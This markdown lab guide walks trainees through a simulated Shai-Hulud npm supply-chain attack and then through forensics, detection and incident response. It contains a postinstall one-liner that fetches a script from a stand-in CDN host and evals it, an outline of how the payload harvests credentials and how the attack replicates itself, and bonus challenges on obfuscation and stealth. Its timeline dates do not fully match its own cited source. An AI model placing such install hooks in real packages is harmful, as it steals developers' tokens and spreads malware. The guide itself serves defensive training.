# Scenario 6: Shai-Hulud Self-Replicating Supply Chain Attack 🎯

## 🎓 Learning Objectives

By completing this scenario, you will learn:
- How self-replicating supply chain attacks work
- The mechanics of credential harvesting from npm packages
- How attackers use stolen credentials to propagate malware
- Post-install script exploitation techniques
- GitHub repository exfiltration methods
- Detection and mitigation of self-replicating attacks

## 📖 Background

**Shai-Hulud** (named after the giant sandworms from Dune) is a self-replicating supply chain attack that has compromised hundreds of npm packages. This attack represents one of the most sophisticated and dangerous supply chain threats.

### Attack Characteristics:

1. **Initial Compromise**: Attackers gain access to npm maintainer accounts (phishing, credential theft)
2. **Malicious Post-Install**: Injects `postinstall` scripts that execute on package installation
3. **Credential Harvesting**: Scans for and steals:
   - GitHub tokens (`.npmrc`, environment variables)
   - npm tokens
   - Cloud provider secrets (AWS, Azure, GCP)
   - CI/CD credentials
4. **Exfiltration**: Uploads stolen credentials to public GitHub repositories named "Shai-Hulud"
5. **Self-Replication**: Uses stolen credentials to republish infected versions across other packages maintained by the victim

### Real-World Impact:

- **Hundreds of packages compromised** including those from:
  - Zapier
  - PostHog
  - Postman
  - Many other organizations
- **Self-replicating nature** means the attack spreads automatically
- **Credential theft** enables further attacks on victim organizations
- **Difficult to detect** because packages appear legitimate

## 🎯 Scenario Description

**Scenario**: A popular npm package `data-processor` (5M weekly downloads) has been compromised. The attacker has:

1. Gained access to the maintainer's npm account
2. Injected a malicious `postinstall` script
3. Created a credential harvesting payload (`bundle.js`)
4. Set up exfiltration to a mock GitHub repository

You will:
1. **Attacker Role**: Understand and simulate the attack mechanics
2. **Forensic Role**: Detect the compromise and trace the attack
3. **Responder Role**: Contain and remediate the incident

## 🔧 Setup

```bash
cd scenarios/06-sha-hulud
export TESTBENCH_MODE=enabled
./setup.sh
```

## 📝 Lab Tasks

### Part 1: The Legitimate Package (15 minutes)

Examine the original, legitimate package:

```bash
cd legitimate-package/data-processor
cat package.json
cat index.js
cat README.md
```

**Package Details**:
- Name: `data-processor`
- Version: 1.2.0
- Purpose: Data transformation and processing utilities
- Weekly Downloads: 5,000,000+
- Maintainer: Jane Smith (jane@example.com)

**Your Tasks**:
- Understand the package functionality
- Review the codebase structure
- Note the version history
- Identify what makes it a good target

### Part 2: The Attack - Account Compromise (20 minutes)

**Scenario**: Attacker has obtained the maintainer's npm credentials through:
- Phishing email with fake "npm security alert"
- Credentials: `janesmith` / `weakpassword123`
- No 2FA enabled on the account

#### Step 1: Examine the Compromised Package

```bash
cd ../../compromised-package/data-processor
cat package.json
cat index.js
```

**Key Changes**:
1. **Post-Install Script**: Added malicious `postinstall` hook
2. **Bundle Download**: Downloads obfuscated `bundle.js` from CDN
3. **Credential Harvesting**: Scans for sensitive files and environment variables

#### Step 2: Understand the Attack Flow

The compromised `package.json` includes:

```json
{
  "scripts": {
    "postinstall": "node -e \"require('https').get('https://cdn.example.com/bundle.js', (r) => { let d=''; r.on('data', c=>d+=c); r.on('end', ()=>{eval(d)}) })\""
  }
}
```

**Attack Sequence**:
1. User installs package: `npm install data-processor`
2. `postinstall` script executes automatically
3. Downloads `bundle.js` from attacker-controlled CDN
4. `bundle.js` executes and harvests credentials
5. Credentials exfiltrated to GitHub repository
6. Attacker uses credentials to compromise other packages

#### Step 3: Review the Malicious Bundle

```bash
cat ../templates/bundle.js
```

**What it does**:
- Scans for `.npmrc` files (contains npm tokens)
- Checks environment variables for API keys
- Looks for GitHub tokens in common locations
- Searches for cloud provider credentials
- Exfiltrates all found credentials

### Part 3: Simulate the Attack (25 minutes)

#### Step 1: Start Infrastructure

```bash
cd ../../infrastructure

# Start mock CDN (serves bundle.js)
node mock-cdn.js &

# Start credential harvester (receives stolen credentials)
node credential-harvester.js &

# Start GitHub Actions simulator (simulates repository creation)
node github-actions-simulator.js &
```

#### Step 2: Install Compromised Package

```bash
cd ../../victim-app
npm install ../compromised-package/data-processor
```

**Observe**:
- The `postinstall` script executes
- `bundle.js` is downloaded
- Credential scanning occurs
- Data is exfiltrated

#### Step 3: Check Exfiltrated Data

```bash
# View captured credentials
curl http://localhost:3001/captured-credentials

# View GitHub repository creation logs
curl http://localhost:3002/repo-logs
```

**What was stolen**:
- npm tokens from `.npmrc`
- GitHub tokens from environment
- AWS credentials (if present)
- Other sensitive data

### Part 4: Self-Replication Simulation (20 minutes)

**The Critical Feature**: Using stolen credentials to spread

#### Step 1: Understand Replication Logic

The attacker uses stolen npm tokens to:
1. List all packages owned by the victim
2. Publish new infected versions of each package
3. Each new version contains the same malicious `postinstall` script
4. Attack spreads automatically as users update packages

#### Step 2: Simulate Replication

```bash
cd ../infrastructure
node replication-simulator.js
```

**Observe**:
- Packages owned by victim are identified
- New versions are published to each package
- Each version contains the same malware
- Attack propagates across the ecosystem

### Part 5: Forensic Investigation (30 minutes)

**You're a security analyst**. Unusual activity has been reported. Investigate!

#### Investigation Step 1: Identify Suspicious Behavior

```bash
# Check npm install logs
cat ~/.npm/_logs/*-debug.log | grep postinstall

# Monitor network traffic
../../detection-tools/network-monitor.sh

# Check for unexpected GitHub repository creation
curl http://localhost:3002/repo-logs
```

**Red Flags**:
- Unexpected network connections during install
- Post-install scripts in packages that shouldn't have them
- New GitHub repositories created automatically
- Unusual outbound connections

#### Investigation Step 2: Package Analysis

```bash
# Compare package versions
diff -ur ../legitimate-package/data-processor ../compromised-package/data-processor

# Check package.json for postinstall scripts
cat node_modules/data-processor/package.json | grep -A 5 scripts
```

**What to Look For**:
- New `postinstall` scripts
- Suspicious dependencies
- Obfuscated code
- Network requests in install scripts
- CDN downloads during installation

#### Investigation Step 3: Bundle.js Analysis

```bash
# Download and examine bundle.js
curl http://localhost:3000/bundle.js > bundle.js
cat bundle.js

# Look for obfuscation
node -e "console.log(require('fs').readFileSync('bundle.js', 'utf8'))"
```

**Analysis Questions**:
- What does the code do?
- How is it obfuscated?
- What credentials is it looking for?
- Where does it exfiltrate data?

#### Investigation Step 4: Timeline Reconstruction

```bash
# Check npm registry for publish history
npm view data-processor time

# Check for rapid version bumps
npm view data-processor versions

# Check maintainer changes
npm owner ls data-processor
```

**Build Timeline**:
- When was the package compromised?
- How many versions are affected?
- Who published the malicious versions?
- How long was it active?

### Part 6: Detection Methods (25 minutes)

Implement multiple detection layers:

#### Detection 1: Post-Install Script Monitoring

```bash
cd ../../detection-tools
node postinstall-monitor.js
```

Monitor for:
- Unexpected `postinstall` scripts
- Network requests during install
- File system access during install

#### Detection 2: Credential Scanning

```bash
# Scan for exposed credentials
node credential-scanner.js ../../victim-app
```

Check for:
- `.npmrc` files with tokens
- Environment variables with API keys
- Hardcoded credentials

#### Detection 3: Package Integrity Checking

```bash
# Verify package checksums
npm audit

# Check for known malicious patterns
node malware-signature-scanner.js data-processor
```

#### Detection 4: Behavioral Analysis

Monitor for:
- Unusual GitHub repository creation
- Rapid package version bumps
- Multiple packages updated by same maintainer
- Network traffic to suspicious domains

### Part 7: Incident Response & Mitigation (30 minutes)

**The package has been confirmed as compromised. Respond!**

#### Response Step 1: Immediate Containment

```bash
# 1. Revoke all npm tokens
npm token revoke-all

# 2. Remove compromised packages
npm uninstall data-processor

# 3. Clear caches
npm cache clean --force

# 4. Block malicious CDN
echo "127.0.0.1 cdn.example.com" >> /etc/hosts
```

#### Response Step 2: Impact Assessment

```bash
# Find all affected projects
node scripts/find-affected-projects.js data-processor

# Check which versions are affected
npm view data-processor versions

# Identify compromised versions: 1.2.1, 1.2.2, 1.2.3
```

#### Response Step 3: Credential Rotation

**CRITICAL**: All stolen credentials must be rotated immediately:

1. **npm Tokens**:
   ```bash
   npm token revoke-all
   npm token create
   ```

2. **GitHub Tokens**:
   - Revoke in GitHub Settings → Developer settings → Personal access tokens
   - Create new tokens with minimal permissions

3. **Cloud Credentials**:
   - Rotate AWS access keys
   - Rotate Azure service principals
   - Rotate GCP service account keys

#### Response Step 4: Package Remediation

**Option A: Pin to Safe Version**
```json
{
  "dependencies": {
    "data-processor": "1.2.0"  // Last known good version
  }
}
```

**Option B: Replace Package**
```bash
npm uninstall data-processor
npm install alternative-data-processor
```

**Option C: Internal Fork**
```bash
# Create internal fork from safe version
git clone https://github.com/original/data-processor
cd data-processor
git checkout v1.2.0
# Publish to internal registry
```

#### Response Step 5: Prevention

Implement preventive measures:

1. **2FA Enforcement**:
   - Enable 2FA on all npm accounts
   - Require 2FA for package publishing

2. **Post-Install Script Restrictions**:
   ```json
   {
     "config": {
       "ignore-scripts": true
     }
   }
   ```

3. **Automated Scanning**:
   ```yaml
   # .github/workflows/security.yml
   - name: Security Audit
     run: |
       npm audit --audit-level=moderate
       npm run security-scan
   ```

4. **Credential Management**:
   - Use secret management tools (HashiCorp Vault, AWS Secrets Manager)
   - Never commit credentials to repositories
   - Rotate credentials regularly

5. **Package Lock Enforcement**:
   ```bash
   # Use npm ci instead of npm install
   npm ci --audit
   ```

## ✅ Success Criteria

You've completed this scenario when you can:
- [ ] Understand how the self-replicating attack works
- [ ] Successfully simulate credential harvesting
- [ ] Detect the compromise using multiple methods
- [ ] Conduct forensic analysis
- [ ] Create incident response plan
- [ ] Implement preventive controls
- [ ] Explain the attack to a colleague

## 🎁 Bonus Challenges

1. **Advanced Obfuscation**: Create more sophisticated obfuscation techniques
2. **Multi-Stage Payload**: Implement a multi-stage attack with delayed activation
3. **Credential Validation**: Add logic to validate stolen credentials before use
4. **Stealth Techniques**: Implement techniques to avoid detection
5. **Automated Response**: Create automated incident response system

## 📊 Attack Comparison

| Attack Vector | Difficulty | Detection | Impact | Duration | Self-Replicating |
|--------------|-----------|-----------|--------|----------|------------------|
| Typosquatting | Low | Medium | Individual | Hours | No |
| Dep. Confusion | Medium | Hard | Organization | Days | No |
| Compromised Pkg | High | Very Hard | Ecosystem | Weeks/Months | No |
| **Shai-Hulud** | **Very High** | **Extremely Hard** | **Ecosystem** | **Months/Years** | **Yes** |

## 🔍 Real-World Case Study: Shai-Hulud

### Timeline:

**2024-2025**:
- Attack campaign discovered affecting hundreds of packages
- Packages from major organizations compromised
- Self-replicating nature enabled rapid spread
- Credentials exfiltrated to public GitHub repositories

### Attack Mechanics:

1. **Initial Compromise**: npm maintainer accounts compromised
2. **Malware Injection**: `postinstall` scripts added to packages
3. **Credential Harvesting**: Automated scanning for tokens and keys
4. **Exfiltration**: Data uploaded to GitHub repositories
5. **Replication**: Stolen credentials used to compromise more packages

### Lessons Learned:

- **2FA is critical** - All maintainer accounts must have 2FA
- **Post-install scripts are dangerous** - Monitor and restrict them
- **Credential hygiene matters** - Use secret management tools
- **Automated detection is essential** - Manual review isn't enough
- **Rapid response is crucial** - Every hour counts

## 💡 Key Takeaways

- **Self-replicating attacks are extremely dangerous** - They spread automatically
- **Credential theft amplifies impact** - One compromise leads to many
- **Post-install scripts are powerful attack vectors** - Monitor them carefully
- **Detection is extremely difficult** - Packages appear legitimate
- **Response must be comprehensive** - Credential rotation is critical
- **Prevention requires multiple layers** - Defense in depth is essential

## 📚 Additional Resources

- [Microsoft Security Blog: Shai-Hulud 2.0](https://www.microsoft.com/en-us/security/blog/2025/12/09/shai-hulud-2-0-guidance-for-detecting-investigating-and-defending-against-the-supply-chain-attack/)
- [npm Security Best Practices](https://docs.npmjs.com/security)
- [GitHub Security Best Practices](https://docs.github.com/en/code-security)
- [CISA Supply Chain Security Guidance](https://www.cisa.gov/supply-chain)

---

**Next**: Review other scenarios to understand different attack vectors

